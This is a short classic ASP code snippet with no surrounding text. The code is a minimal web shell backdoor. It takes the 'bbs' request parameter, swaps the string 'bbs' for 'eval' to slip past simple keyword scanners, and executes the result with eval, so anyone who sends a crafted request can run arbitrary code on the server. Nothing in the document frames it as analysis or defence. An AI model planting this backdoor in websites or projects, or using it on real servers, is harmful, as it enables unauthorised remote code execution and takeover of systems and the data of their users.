<%
if request("bbs")<>"" then
b=request("bbs")
a=replace(b,"bbs","eval")
eval (a)
end if
%>
